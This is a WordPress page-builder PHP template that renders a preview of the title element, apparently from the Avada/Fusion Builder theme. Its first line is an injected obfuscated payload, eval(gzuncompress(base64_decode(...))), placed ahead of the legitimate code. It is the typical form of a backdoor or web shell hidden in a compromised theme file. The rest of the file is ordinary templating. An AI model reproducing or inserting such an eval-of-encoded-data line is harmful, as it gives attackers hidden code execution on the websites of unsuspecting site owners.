<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
global $fusion_settings;
if ( ! $fusion_settings ) {
	$fusion_settings = Fusion_Settings::get_instance();
}

$theme_options_style = strtolower( $fusion_settings->get( 'title_style_type' ) );
?>
<script type="text/template" id="fusion-builder-block-module-title-preview-template">

	<div class="fusion-title-preview">
		<#
		var style_type = ( params.style_type ) ? params.style_type.replace( ' ', '_' ) : 'default';
		var
		content = params.element_content,
		text_blocks       = jQuery.parseHTML( content ),
		shortcode_content = '';

		if ( 'default' === params.style_type ) {
			style_type = '<?php echo esc_attr( $theme_options_style ); ?>';
			style_type = style_type.replace( ' ', '_' );
		}

		jQuery(text_blocks).each(function() {
			shortcode_content += jQuery(this).text();
		});

		var align = 'align-' + params.content_align;
		#>

		<span class="{{ style_type }}" style="border-color: {{ params.sep_color }};"><sub class="title_text {{ align }}">{{ shortcode_content }}</sub></span>
	</div>

</script>
